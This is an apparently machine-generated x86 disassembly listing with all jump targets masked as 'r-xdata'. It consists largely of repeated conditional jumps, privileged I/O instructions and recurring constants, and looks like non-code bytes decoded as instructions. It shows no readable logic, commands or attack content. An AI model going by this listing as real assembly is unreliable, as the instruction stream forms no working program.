jb r-xdata
xchg edi eax
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
inc esi
or eax [ ebp + 0x1c ]
sbb eax 0x7272721d
in eax dx
sbb eax 0x56af6f1d
outsd
jb r-xdata
jb r-xdata
imul esp [ edx + ecx ] 0x1d1d1f3a
mov ebx 0x66ed2267
jmp r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
push edx
mov ch 0x6b
outsd
cmpsb [ esi ] [ edi ]
xor ch ch
push ebp
or ecx [ ecx + 0x721d1d09 ]
jb r-xdata
loop r-xdata
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and ch ch
jb r-xdata
or cl [ eax + 0x6b84bd8f ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x67ed2267
hlt
or bh [ eax + edx + 0x1d ]
jb r-xdata
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
mov [ 0xffffffff881d1d5a ] ax
jb r-xdata
jb r-xdata
or cl [ esi ]
pop eax
sbb eax 0xee26611d
and ch ch
mov dl 0xb
shr [ ebx ] cl
sbb eax 0x7272721d
jl r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp [ edi - 0x1e ]
sbb eax 0x55edfeb5
movsb [ edi ] [ esi ]
in al 0xb
popfd
sub [ 0x7272721d ] bl
mov dl dl
imul ebp [ edx ] 0x72721d1d
jb r-xdata
sbb eax 0x67ed1d67
jb r-xdata
sbb eax 0xf2a16f1d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ ebp - 0x58947b48 ] al
add [ ebx + ebp * 2 - 0x7b477f49 ] 0x6b
mov bh 0x86
jb r-xdata
mov al ah
outsd
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xbc0bfa97
in al dx
loop r-xdata
jb r-xdata
mov cl 0xb
adc al 0xc1
loop r-xdata
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
jmp edx
mov bl ah
or ebx eax
loop r-xdata
or esi [ ebx ]
loop r-xdata
sbb [ 0x751db21d ] ebx
mov dl 0x6f
and dh [ edx - 0x27f41c78 ]
cmp al 0xb
push esi
shl [ edx ] 0x1
mov [ 0xffffffffe2f8bc0b ] al
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xor cl [ ebx ]
mul edx
shl al cl
loop r-xdata
push cs
sbb eax 0x1ec10a1d
mov bh 0xea
outsd
sub bl [ bx ]
jb r-xdata
mov ah 0xb
xor al 0xc2
mov [ ebx + ecx + 0x1d1d10a7 ] dl
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
or cl [ edx ]
jb r-xdata
mov cl 0xb4
pop esp
into
loop r-xdata
loop r-xdata
mov edi 0x721d1d3b
jb r-xdata
adc ch [ ecx + 0x1c ]
or edi [ ebp - 0x6 ]
lahf
mov ebx 0x67ed2267
mov ah 0x3d
jb r-xdata
or ecx [ ebx + 0xe ]
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
into
or ch al
sbb al 0x1d
sbb eax 0xc3df028a
sbb eax 0x6b0aea97
add [ 0xbbbbb1d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ ebx + 0x1 ]
sbb eax 0xbbbbb1d
pop ebp
shl [ edx ] 0x1
or eax [ eax + 0x721d1d1d ]
jb r-xdata
or eax [ ecx + ecx * 8 - 0x1e ]
loop r-xdata
mov dl 0xb2
mov dl 0xb1
jb r-xdata
jb r-xdata
mov edx 0xe2f8900b
loop r-xdata
mov [ ebp + 0x6a76b84 ] dl
jb r-xdata
sbb [ eax ] esi
jb r-xdata
jb r-xdata
lahf
jb r-xdata
or [ eax + 0x6b84bd8a ] cl
lahf
mov ebp 0xa9f6b84
jb r-xdata
jb r-xdata
jb r-xdata
hlt
adc [ 0xffffffffed22671d ] bl
jb r-xdata
and ch ch
jb r-xdata
pop esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop edx
sbb eax 0xba8d881d
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
mov bh 0xb
mov [ 0x721d1d07 ] eax
adc ebx [ 0x7272721d ]
jb r-xdata
sbb esi [ ebp + 0x1d2de60b ]
sbb eax 0x72727272
loop r-xdata
jb r-xdata
push edx
sub ch [ edi + 0x6f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb51d0697
sbb eax 0x204a67ed
jb r-xdata
outsd
jb r-xdata
imul esi [ edi + 0x6b84b880 ] 0xffffffb7
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esi + 0x10af6b84 ] dl
mov ebx 0x6b84cc88
sbb eax 0xe2e24675
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bh [ ebx + ecx - 0x1d1d104c ]
jb r-xdata
jb r-xdata
mov dl 0x6f
jb r-xdata
mov bh 0xa
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
sbb eax 0xa751db2
jb r-xdata
popad
jb r-xdata
mov esp 0xe2efb40b
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
xchg esi eax
test [ ebx - 0x51 ] ch
adc [ ebx + 0x6b84cc88 ] bh
pop edi
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1d016b0a 0xbb1d
jb r-xdata
mov edi 0xec7e0bca
jb r-xdata
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb
mov esp ebp
loop r-xdata
sbb eax 0x9c19ad8a
out dx eax
mov ch 0x6b
add bl [ 0xffffffff9ea46b1d ]
jb r-xdata
sbb [ 0xfffffffffd9267ed ] ebx
loop r-xdata
push es
sbb eax 0xee26611d
imul ebx [ esi + 0xab4f6c6 ] 0xffffff90
mov bl [ 0xffffffffb1e2e2e2 ]
mov ah 0xa
daa
push ds
jb r-xdata
fwait
sahf
sbb eax 0x7272721d
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
mov [ edi - 0x60947b43 ] cl
jb r-xdata
imul ebx [ edi - 0x427077f6 ] 0xffffff84
imul ebx [ edi + 0x6b84bd00 ] 0xffffff9f
jb r-xdata
jb r-xdata
outsd
jb r-xdata
or esp [ ebx + 0x721d1d07 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x5c ] ch
sbb eax 0xb2bb5a1d
jb r-xdata
sbb eax 0xbba8d88
sbb al [ ebx + 0x7272721d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1ea7691e ] 0xffffffe1
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
or edi eax
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
xchg edi eax
movsb [ edi ] [ esi ]
salc
or esp [ esi - 0x11 ]
loop r-xdata
sbb eax 0x104c0a72
sbb eax 0x2267bb1d
jb r-xdata
jb r-xdata
mov al [ 0x45f7be6a ]
popad
sbb al 0xc2
jb r-xdata
sbb eax 0xf60b67ed
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
adc [ 0x7272721d ] bl
sbb eax 0xa70b9488
xchg esi eax
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x160f0bee ] 0x6f721d1d
jb r-xdata
sbb eax 0xe2e20a75
jb r-xdata
jb r-xdata
sbb eax 0xe2e26274
loop r-xdata
0xf7be6aa0 0x6145
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0xef
loop r-xdata
sbb eax 0x7272721d
or bl [ ebp + 0xb1d1d38 ]
sbb eax 0xb94881d
jb r-xdata
cmp [ ebx + ecx + 0x1d1d07b0 ] esi
jb r-xdata
jb r-xdata
and ch ch
mov ah 0x3d
out 0xe3 al
loop r-xdata
loop r-xdata
jb r-xdata
or ch [ 0xb1d1d1f ]
push edi
dec edx
and edx 0xffffffe2
and eax 0x7afac6a6
fsub st2
loop r-xdata
or edi [ esi - 0x14 ]
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0xe2e26274
or dh [ edx + 0xb1d1d36 ]
or esi [ ebx ]
or bl [ 0xffffffffb172721d ]
loop r-xdata
jb r-xdata
jb r-xdata
lahf
or dh cl
push cs
mov [ ebp + 0x1d18d60b ] al
sbb eax 0x72727272
jb r-xdata
mov ebp 0x89f6b84
mov [ edx - 0x60947b43 ] cl
jb r-xdata
jb r-xdata
or ebx [ ecx ]
jb r-xdata
add [ ebp + 0xa9f6b84 ] bh
jb r-xdata
jb r-xdata
mul [ es : edi + 0x22 ]
jb r-xdata
pop edx
jb r-xdata
pop sp
jb r-xdata
lea edi [ edx + 0x1d041a0b ]
jb r-xdata
sbb eax 0x25000b1d
lahf
jb r-xdata
jb r-xdata
into
jb r-xdata
sbb eax 0xed22671d
mov bx 0x1d32
sbb eax 0x130b22d1
nop [ 0x72727272 ] ebx
jb r-xdata
or ch [ edx + 0x10 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
clc
jb r-xdata
jb r-xdata
or edx [ ebx ]
loop r-xdata
jb r-xdata
and ah dl
jb r-xdata
out 0xc6 al
arpl [ esi ] cx
dec esi
out 0xe2 al
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x8ae688b5
or esi [ edi + ebp * 8 + 0x7272e2e2 ]
jb r-xdata
sbb [ 0x751db21d ] ebx
or eax ebp
or ah dl
mov dh 0x19
and al 0xea
mov esi 0x1c6145f7
retn 0x60ed
in eax dx
pushad
or edi [ edi ]
mul dl
loop r-xdata
or ecx [ eax - 0x14 ]
cmpsd [ esi ] [ edi ]
push ds
loope r-xdata
jb r-xdata
mov esi 0xb21d1d1f
rcl [ esp + esi * 4 ] 0x1
sbb eax 0x6e0baeb5
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
or ecx [ edi ]
push ss
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0xa721d1d
jb r-xdata
loop r-xdata
sbb ah [ edi + 0x1d ]
in eax dx
or esi esi
push edx
push 0xffffffbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl dl 0x1
loop r-xdata
outsd
sbb eax 0x7272721d
jb r-xdata
imul ebp [ edi + 0xb808818 ] 0x6c
push ds
movsb [ edi ] [ esi ]
salc
mov dl 0xb
pop edx
cld
loop r-xdata
mov dh ah
jb r-xdata
in al dx
jb r-xdata
sbb eax 0x2267bb1d
in eax dx
jmp r-xdata
and al 0xa
cmp bl [ edi ]
sbb eax 0x1d5bd90a
jb r-xdata
jb r-xdata
mov dl 0x36
sbb eax 0x30190b1d
test [ ebx - 0x49 ] ch
pop esp
mov eax 0x6b848d88
mov bh 0x22
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
imul ebx [ edi - 0x427577f8 ] 0xffffff84
imul ebx [ edi + 0xb85880e ] 0xffffffd6
jb r-xdata
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0xe2
jb r-xdata
pop esp
jb r-xdata
or ebx [ edx ]
jb r-xdata
mov ah 0xa
fldcw [ eax ]
loop r-xdata
outsd
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2472721d
cmpsd [ esi ] [ edi ]
sbb eax 0xe7ce0ae2
loop r-xdata
mov dl 0xb5
or esi [ edx + ebx ]
imul esp edx 0x6bfaa269
out 0xc6 al
je r-xdata
sbb eax 0xbf2a16f
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + 0x72e2e2f4 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc esi edx
loop r-xdata
outsd
loop r-xdata
jb r-xdata
add [ 0x1ea71d1d ] ebx
mov ch 0xb
add eax [ 0x676f1d1d ]
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xb1ea71d
dec eax
jb r-xdata
into
outsb
or ebx esp
xor bl [ ebx - 0x629e8de3 ]
retn 0xbe3
mov [ 0xffffffffc6e66bfa ] al
jb r-xdata
loop r-xdata
and ah dl
jb r-xdata
jb r-xdata
jb r-xdata
movhps xmm3 [ 0xffffffffb76f721d ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebp + 0x61 ] 0x60edc21c
fldenv [ esi + edx * 8 - 0x1d1099f5 ]
loop r-xdata
loop r-xdata
or ebp [ esi - 0x32 ]
loop r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
push ds
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
sbb al 0xb
lodsb [ esi ]
shl edx 0x1
loop r-xdata
outsd
imul esp [ edi + 0x16971dea ] 0x1d0e4b0b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
push 0xd1e2e2ec
loop r-xdata
sbb eax 0x1dee2661
jne r-xdata
fstp [ ebx + 0x1d ]
mov ch 0x6b
movsb [ edi ] [ esi ]
0x1d36e50a 0x8a1d
jb r-xdata
and cl [ ebx ]
mov eax 0x721d1d59
fldcw [ ecx ]
jb r-xdata
or edi [ eax + 0x721d1d59 ]
or bl [ esi + 0x61e2e2e1 ]
jb r-xdata
lahf
jb r-xdata
out 0x66 eax
loop r-xdata
cmp [ 0xffffffffc6a6691d ] ebx
sbb eax 0xe266e7d2
loop r-xdata
int1
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
and eax 0xe28813a7
mov dl ah
and eax 0xe28817a7
xor edi [ esi ]
jb r-xdata
loop r-xdata
or ebp [ edx ]
jb r-xdata
imul esp [ edx + ebp * 8 + 0xbf2a769 ] 0xffffff9d
loope r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xe2b2bb5a
jb r-xdata
add al 0x1d
jb r-xdata
or eax [ ecx + 0x721d1d5c ]
xor [ edi ] 0x646b1d1d
push esi
loop r-xdata
mov ah 0xb4
or edi [ ebx + 0x11 ]
outsd
jb r-xdata
loop r-xdata
mov eax [ 0x38f80bf2 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
imul ebp [ edi - 0x7b4f44f6 ] 0x6b
scasd [ edi ]
mov [ edx + 0x65e0bb8 ] bl
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ebp + 0x39 ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
or bl [ ebx - 0x2e1d1d0b ]
and cl [ ebx ]
push ecx
in eax 0xe2
adc [ 0x2267bb1d ] bl
sbb eax 0x4c0a721d
jb r-xdata
loop r-xdata
sbb eax 0xe288ee97
sbb eax 0xe2e26272
loop r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x72727221
sbb eax 0xb76f721d
jb r-xdata
jb r-xdata
push cs
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x1ea71d1d
jb r-xdata
int 0xf0
loop r-xdata
and ch ch
dec esp
fcomp [ 0xa721d1d ]
jb r-xdata
imul esp [ 0x1d028b0b ] 0x7272721d
jb r-xdata
jb r-xdata
push cs
arpl [ esi ] cx
mov dh 0xeb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc esp [ esi + 0x30 ]
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0xb8688ba ] bh
stosb [ edi ]
out 0xe2 eax
loop r-xdata
push ds
loop r-xdata
in eax dx
jne r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
in al dx
fwait
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
mov ebx 0x84e2e2b2
jb r-xdata
sbb eax 0xe6a46b1d
or dl [ esi - 0x75e2e2c9 ]
and [ ebp + 0x45 ] 0xd4
mov ch 0x6b
push edx
loop r-xdata
imul ebx [ esi + 0xab4f6c6 ] 0xffffffd9
imul esp [ esi + 0x1d37960a ] 0x1d
mov al [ edx - 0x4a2bba9b ]
imul esp [ edx + edx * 2 - 0x1e ] 0xffffffe2
or ch [ edi + 0x6f ]
jb r-xdata
mov ah 0xf6
or edx [ ecx + edx + 0xb721d1d ]
xor eax 0xffffffe2
loop r-xdata
loop r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
jb r-xdata
jb r-xdata
jb r-xdata
sti
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
outsd
sbb bl [ edi ]
sbb eax 0xf5e20a1d
cmpsd [ esi ] [ edi ]
and dh [ edx + 0x1fbe676f ]
sbb eax 0x971db21d
0xb236a76f 0x9b0b
cli
jb r-xdata
imul esp esi 0xffffffc6
sbb ah [ edi + 0x1d ]
in eax dx
loop r-xdata
shl [ edx ] 0x1
mov cl 0xb
mov al [ 0xffffffffd1e2e2f8 ]
popad
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
fwait
cmc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x100bba88
retn 0xe2e2
jb r-xdata
sbb eax 0x751db21d
outsd
mov dh 0x19
push ds
mov bl 0xb
and dh [ edx - 0x50901f78 ]
in al dx
sbb eax 0x480b1ea7
loopne r-xdata
fldenv [ ecx ]
in eax dx
or edx [ edx ]
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov cl 0xb4
mov ch [ ebx - 0x3f ]
jb r-xdata
leave
jb r-xdata
jb r-xdata
xor ch ch
jb r-xdata
jb r-xdata
jb r-xdata
and esp eax
mov ch 0x69
sbb [ ecx + 0x18 ] ah
iretd
or al 0x29
sbb eax 0x7272721d
popad
xor al [ ebx + ebp * 2 - 0x7747a749 ]
xchg [ ebx + ebp * 2 - 0x7747a149 ] al
add [ ebx + ebp * 2 - 0x7747a349 ] 0x8d
test [ ebx - 0x49 ] ch
sbb eax 0x7272721d
fstp [ ecx ]
in eax dx
cmpsd [ esi ] [ edi ]
adc cl [ eax + 0xb216990 ]
and [ esi ] bl
loop r-xdata
or cl bl
push es
sbb eax 0xed21d91d
push 0xe2ec
jne r-xdata
jb r-xdata
sub [ 0x25000b1d ] bl
or bl cl
outsd
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fldenv [ ecx ]
in eax dx
jb r-xdata
0xbf2a769 0xe19d
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sbb eax 0xea76f1d
jb r-xdata
shr [ esi ] cl
sub ecx [ ebx ]
jb r-xdata
jb r-xdata
sbb eax 0x971d1e97
push es
sbb eax 0xe28afeb5
outsd
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ esi + 0x721d1d01 ]
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
mov edx 0x1d3e360b
or edx eax
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf2a1691d
and ch ch
mov si 0xe2ff
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
shl [ edx ] 0x1
or edx [ ecx - 0x1b ]
loop r-xdata
loop r-xdata
mov bh 0x69
cli
or edi [ esp + ebp * 8 + 0x751de2e2 ]
inc esi
loop r-xdata
sbb eax 0x971db272
jb r-xdata
loop r-xdata
imul esp [ edi - 0x115096e2 ] 0x1d160f0b
mov edx 0xe2c2100b
loop r-xdata
jb r-xdata
push cs
jb r-xdata
xchg esp eax
jb r-xdata
push ds
imul edi [ edi - 0x7bc62ee2 ] 0x6b
mov edi 0xd1ac0b1c
loop r-xdata
ror [ ebx ] 0xe2
jb r-xdata
salc
loop r-xdata
push ds
jb r-xdata
popad
sbb bh cl
or esi [ ebx + 0x5 ]
sbb eax 0x88ba721d
xchg [ ecx + 0x12a76b84 ] edi
or ecx [ ecx + 0x1d1d1d2a ]
cmc
or edi [ eax + 0x721d1d5f ]
jb r-xdata
mov [ ebx + 0x6a76b84 ] ch
jb r-xdata
jb r-xdata
mov cl 0x61
mov [ eax + 0x200b2169 ] dl
sbb eax 0x8788ba72
mov ecx 0x12a76b84
adc al 0xd9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x1bd5f4e2 ] 0xffffffe2
stosb [ edi ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
outsd
jb r-xdata
or [ ebx ] 0x79
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push ds
sbb eax 0xb51d0697
dec [ edx - 0x1d1d9d1e ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
ror ah 0x1
loop r-xdata
jb r-xdata
jb r-xdata
mov [ 0x1d1e9f6b ] bl
or esi [ ecx + 0x72e2e2ff ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
outsd
push cs
mov ch 0x88
out 0x8a al
shr [ ebx ] 0x1
or ecx [ edx - 0x7 ]
loop r-xdata
scasd [ edi ]
0x1d01b00b 0x721d
and eax 0x918e1ea7
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] 0x72721d1d
mov [ ebp - 0x1d0c1cf5 ] cl
jb r-xdata
or eax 0x72721d1d
jb r-xdata
or edi edx
jb r-xdata
sbb eax 0x1db2721d
sar [ edx - 0x63f43878 ] 0x1e
sbb cl [ ebx ]
jb r-xdata
adc dl al
jb r-xdata
loop r-xdata
sbb eax 0xb4727272
jb r-xdata
jb r-xdata
loopne r-xdata
loop r-xdata
imul ecx [ esi ] 0xebb60e63
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
push es
test [ ebx - 0x59 ] ch
jb r-xdata
sbb cl cl
jb r-xdata
or ecx [ edi + ecx + 0x72721d1d ]
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
fcom [ esi ]
sbb eax 0xd5da8a1d
mov dl ah
test [ 0x321d1ba7 ] ah
cmpsd [ esi ] [ edi ]
adc ecx [ eax + 0x25e288e2 ]
or ecx [ ecx + 0x72e2e2e9 ]
jb r-xdata
sbb eax 0xdcd5da8a
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
sub ecx [ bp + di ]
movsb [ edi ] [ esi ]
jb r-xdata
push cs
test [ ebx - 0x59 ] ch
add [ ebx ] cl
mov cl 0xe7
loop r-xdata
cmp eax 0x72721d1d
jb r-xdata
jns r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
sahf
jb r-xdata
jb r-xdata
loop r-xdata
and ah [ esi - 0x1e ]
imul esp [ edi + 0xaa76b1a ] 0x1d1ab20b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
out 0x6b al
cmpsb [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
scasd [ edi ]
push ss
loope r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
lea ecx [ ebx ]
jecxz r-xdata
sbb [ 0xb94881d ] bl
mov edi 0x72e2e2f4
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0x1d028b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
outsb
pop ecx
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x72727272
imul esi [ edi - 0x6e7747c4 ] 0xffffff84
imul esi [ edi - 0x7bcc96fe ] 0x6b
mov bh 0x0
imul esp [ esi + ecx - 0x1e ] 0xffffffe2
sbb eax 0xb172721d
popad
jb r-xdata
sbb eax 0x25727272
jb r-xdata
loop r-xdata
jb r-xdata
fcmovbe st5
jb r-xdata
jb r-xdata
imul esp [ edi - 0x1e62f40e ] 0x7272e2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
cld
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov ss [ ecx + 0x741de2c0 ]
jb r-xdata
or edi [ ecx + 0x3e ]
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
loop r-xdata
mul [ es : edi + 0x22 ]
or esi [ edx ]
adc eax 0x72721d1d
jb r-xdata
xchg ebp eax
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
or cl [ ebx ]
sbb ch [ ecx - 0x59 ]
jb r-xdata
0xe2e2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mul [ ebx - 0x12115027 ]
pushad
adc al 0xfb
int3
mov dh ah
imul esp [ esi - 0x1d75353a ] 0xffffffd2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb ch [ edi - 0x51 ]
add dh [ ebx + 0x691e921d ]
shl dl 0x1d
xchg ecx eax
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
or esp [ eax - 0x2e1d1d08 ]
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah cl
adc cl [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
sbb bh [ ebx + 0x18af6b84 ]
mov [ eax + 0x1d1e6c0b ] al
sbb eax 0x72727272
jb r-xdata
xchg [ ebx + ebp * 2 - 0x7745f359 ] eax
mov [ ecx + 0x2a ] gs
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x64f4ff49 ]
aas
sbb eax 0x751d721d
dec edx
loop r-xdata
push 0xe654edf3
in al dx
jb r-xdata
mov edx 0x6b84ab88
lahf
sbb cl [ ebx ]
neg [ ecx + 0x1d ]
and cl [ ebx ]
pop ss
jecxz r-xdata
mul [ edi + 0x22 ]
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
and ebp ebp
jb r-xdata
and [ ebx ] ecx
rcl [ ecx + ebx * 8 ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ eax + 0x721d1d2a ]
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
or eax 0x72e2e2f0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
dec ebx
retn 0xe2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi esp 0x3d
sbb eax 0xc7510b1d
loop r-xdata
jb r-xdata
adc al 0xd
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x72e2e2ca ]
loop r-xdata
jb r-xdata
into
xchg bp ax
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push ds
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
jb r-xdata
lahf
push ds
in eax dx
popf
add [ 0xffffffffe688b51d ] ebx
outsd
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
loope r-xdata
mov eax [ 0x721d1d3d ]
jb r-xdata
loop r-xdata
jb r-xdata
je r-xdata
sbb eax 0x1d1e9f6b
jb r-xdata
jb r-xdata
mov ch bh
or [ ecx + 0x2a ] ch
test [ ebx - 0x51 ] ch
mov dl al
test [ ebx - 0x51 ] ch
or bh [ ebx - 0x50947b50 ]
jb r-xdata
sbb eax 0x7272212b
jb r-xdata
or dl [ edi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x737745f4 ] 0x69
sub cl [ ebx ]
dec eax
pop esp
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
push esp
in eax dx
push esp
jb r-xdata
or ebx [ ebx + 0x721d1d3f ]
sbb eax 0xe2e24a75
mov [ ecx + 0x2b76b84 ] dl
imul esi [ ebx ] 0xb76b84
loop r-xdata
and ch ch
jb r-xdata
jb r-xdata
jge r-xdata
sbb ebp ebp
fldenv [ ecx ]
jb r-xdata
loop r-xdata
mov ah 0xea
mov [ esi - 0x5990e22f ] ah
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edx + 0x2aa00be6 ] 0x72721d1d
jb r-xdata
pop ecx
sub [ 0x7272721d ] bl
jb r-xdata
sub ecx [ ebx ]
loop r-xdata
jb r-xdata
cmp ah [ edi + 0x39 ]
jb r-xdata
